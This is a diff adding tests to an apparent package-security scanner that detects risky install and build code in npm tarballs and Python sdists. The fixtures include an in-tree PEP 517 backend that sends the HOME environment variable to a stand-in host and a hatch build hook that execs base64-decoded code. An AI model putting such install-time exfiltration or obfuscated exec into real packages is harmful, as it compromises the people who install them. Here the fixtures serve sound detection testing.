@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { makeTgz } from "../test/helpers.js";
-import { analyzeNpmTarball, analyzeSetupPy, referencedFiles } from "./scripts.js";
+import { analyzeNpmTarball, analyzeSdist, analyzeSetupPy, referencedFiles } from "./scripts.js";
 import { readTarGz } from "./tar.js";
 
 const canary = `const fs=require("fs");const http=require("http");
@@ -65,5 +65,80 @@ describe("setup.py", () => {
     const f = analyzeSetupPy("from setuptools import setup\nsetup(name='x', version='1.0')");
     expect([...f.network, ...f.env, ...f.obfuscation]).toEqual([]);
     expect(f.runsCode).toBe(false);
+  });
+});
+
+describe("pyproject-only sdists (PEP 517)", () => {
+  it("in-tree backend via backend-path is flagged and its code analysed", () => {
+    const r = analyzeSdist(
+      makeTgz({
+        "evil-1.0/pyproject.toml": `[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n`,
+        "evil-1.0/_build/backend.py": "import os, urllib.request\ndef build_wheel(*a):\n    urllib.request.urlopen('http://x.example/?' + os.environ['HOME'])\n",
+        "evil-1.0/evil/__init__.py": "",
+      }),
+    )!;
+    expect(r.build).toMatchObject({ backend: "backend", inTree: true, nonStandard: true });
+    expect(r.runsCode).toBe(true);
+    expect(r.files).toEqual(["_build/backend.py"]);
+    expect(r.network.join()).toContain("_build/backend.py");
+    expect(r.env.length).toBeGreaterThan(0);
+  });
+
+  it("dotted in-tree backend module in a package directory", () => {
+    const r = analyzeSdist(
+      makeTgz({
+        "p-1.0/pyproject.toml": `[build-system]\nbuild-backend = "tools.backend.api:Backend"\nbackend-path = ["."]\n`,
+        "p-1.0/tools/backend/api/__init__.py": "import subprocess\nsubprocess.run(['true'])\n",
+      }),
+    )!;
+    expect(r.files).toEqual(["tools/backend/api/__init__.py"]);
+    expect(r.build?.inTree).toBe(true);
+  });
+
+  it("hatch custom hook and pdm_build.py are analysed; standard declarative builds are quiet", () => {
+    const hatch = analyzeSdist(
+      makeTgz({
+        "h-1.0/pyproject.toml": `[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n\n[tool.hatch.build.hooks.custom]\n`,
+        "h-1.0/hatch_build.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
+      }),
+    )!;
+    expect(hatch.build).toMatchObject({ inTree: false, nonStandard: false, hooks: ["hatch_build.py"] });
+    expect(hatch.obfuscation.join()).toContain("hatch_build.py");
+    expect(hatch.runsCode).toBe(true);
+
+    const pdm = analyzeSdist(makeTgz({ "d-1.0/pyproject.toml": `[build-system]\nbuild-backend = "pdm.backend"\n`, "d-1.0/pdm_build.py": "def pdm_build_initialize(ctx):\n    pass\n" }))!;
+    expect(pdm.build?.hooks).toEqual(["pdm_build.py"]);
+
+    const poetry = analyzeSdist(makeTgz({ "q-1.0/pyproject.toml": `[build-system]\nbuild-backend = "poetry.core.masonry.api"\n\n[tool.poetry.build]\nscript = "build.py"\n`, "q-1.0/build.py": "print(1)\n" }))!;
+    expect(poetry.build?.hooks).toEqual(["build.py"]);
+
+    const plain = analyzeSdist(makeTgz({ "ok-1.0/pyproject.toml": `[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n`, "ok-1.0/hatch_build.py": "import os\n" }))!;
+    expect(plain.build).toBeUndefined();
+    expect(plain.runsCode).toBe(false);
+  });
+
+  it("non-standard backend without in-tree code", () => {
+    const r = analyzeSdist(makeTgz({ "n-1.0/pyproject.toml": `[build-system]\nrequires = ["totally-legit-builder"]\nbuild-backend = "totally_legit_builder.api"\n` }))!;
+    expect(r.build).toMatchObject({ backend: "totally_legit_builder.api", inTree: false, nonStandard: true, hooks: [] });
+    expect(r.runsCode).toBe(false);
+  });
+
+  it("sdist with neither setup.py nor pyproject.toml → null", () => {
+    expect(analyzeSdist(makeTgz({ "x-1.0/README": "hi" }))).toBeNull();
+  });
+});
+
+describe("AST eval/Function findings", () => {
+  it("adds what the regexes miss and dedupes what they already found", () => {
+    const f = analyzeNpmTarball(
+      { postinstall: "node a.js" },
+      makeTgz({
+        "package/a.js": "require('./b'); const code = load(); Function(code)(); globalThis.eval(code2)",
+        "package/b.js": "eval('1+1')",
+      }),
+    );
+    const mine = (file: string) => f.obfuscation.filter((o) => o.endsWith(`(${file})`));
+    expect(mine("a.js").sort()).toEqual(["builds code with Function() (a.js)", "uses eval() (a.js)"]);
+    expect(mine("b.js")).toEqual(["uses eval() (b.js)"]); // regex + AST → one entry
   });
 });
